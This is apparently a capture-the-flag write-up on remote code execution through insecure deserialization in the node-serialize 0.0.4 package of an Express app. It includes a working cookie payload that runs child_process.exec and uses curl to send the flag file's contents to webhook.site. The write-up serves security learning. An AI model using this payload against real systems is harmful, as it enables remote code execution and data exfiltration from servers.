# node-serialize
This challenge involves RCE through insecure node deserialization

## solve
```python
app.get('/', (req, res) => {
    if (req.cookies.profile) {
        let str = new Buffer.from(req.cookies.profile, 'base64').toString();

        // Special Filter For You :)

        let obj = serialize.unserialize(str);
        if (obj) {
            res.send("Set Cookie Success!");
        }
    } else {
        res.cookie('profile', "eyJ1c2VybmFtZSI6ICJndWVzdCIsImNvdW50cnkiOiAiS29yZWEifQ==", {
            maxAge: 900000,
            httpOnly: true
        });
        res.redirect('/');
    }

});
```

Checking package-lock.json, we see that serialize model is outdated and will execute arbitrary javascript: https://swisskyrepo.github.io/PayloadsAllTheThings/Insecure%20Deserialization/Node/#methodology
```
"name": "serialize",
"version": "1.0.0",
"license": "ISC",
"dependencies": {
    "cookie-parser": "^1.4.6",
    "express": "^4.18.2",
    "node-serialize": "^0.0.4"
}
```

Also from that page we find the payload for insecure deserialization. Modify the cookie sent back to the server with the payload, we can send the website to webhook:
```
PAYLOAD: {"username": "_$$ND_FUNC$$_function(){require('child_process').exec('curl http://webhook.site?c=$(cat /app/flag)', function(error,stdout, stderr) { console.log(stdout) });}()","country": "Korea"}
```
![image.png](https://dreamhack-media.s3.amazonaws.com/attachments/337008957af0cfa8660f19a1467fc9404980cbe2d56c5703b786ea94cac5164d.png)
